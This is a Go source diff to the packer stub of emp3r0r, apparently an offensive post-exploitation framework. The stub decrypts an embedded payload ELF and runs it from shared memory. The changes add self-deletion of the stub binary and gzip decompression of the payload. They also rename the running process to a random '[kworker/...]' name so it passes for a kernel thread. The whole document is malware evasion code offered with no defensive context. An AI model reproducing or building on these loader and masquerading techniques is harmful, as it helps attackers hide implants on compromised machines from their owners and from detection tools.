@@ -8,10 +8,10 @@ import (
 	"os"
 	"os/exec"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"github.com/jm33-m0/emp3r0r/packer/internal/utils"
+	"github.com/mholt/archiver"
 )
 
 const (
@@ -70,7 +70,12 @@ func runFromMemory(procName string, buffer []byte) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	cmd := exec.Command(shmPath+procName, os.Args[1:]...)
+	err = os.Chdir(shmPath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	cmd := exec.Command(procName, os.Args[1:]...)
+	cmd.Env = os.Environ()
 	err = cmd.Start()
 	if err != nil {
 		log.Fatal(err)
@@ -82,6 +87,7 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
+	os.RemoveAll(os.Args[0]) // self destruction
 	// locate the ELF file
 	elfbegining := bytes.LastIndex(wholeStub, []byte(utils.Sep))
 	elfBytes := wholeStub[(elfbegining + len(utils.Sep)):]
@@ -93,7 +99,17 @@ func main() {
 		log.Fatal("AESDecrypt failed")
 	}
 
+	// decompress
+	var decompressedBytes []byte
+	gz := &archiver.Gz{CompressionLevel: 9}
+	r := bytes.NewReader(elfdata)
+	w := bytes.NewBuffer(decompressedBytes)
+	err = gz.Decompress(r, w)
+	if err != nil {
+		log.Fatalf("Decompress ELF: %v", err)
+	}
+
 	// write ELF to memory and run it
-	procName := fmt.Sprintf("%d", time.Now().UnixNano())
-	runFromMemory(procName, elfdata)
+	procName := fmt.Sprintf("[kworker/%d:%s]", utils.RandInt(), utils.RandStr(7))
+	runFromMemory(procName, w.Bytes())
 }
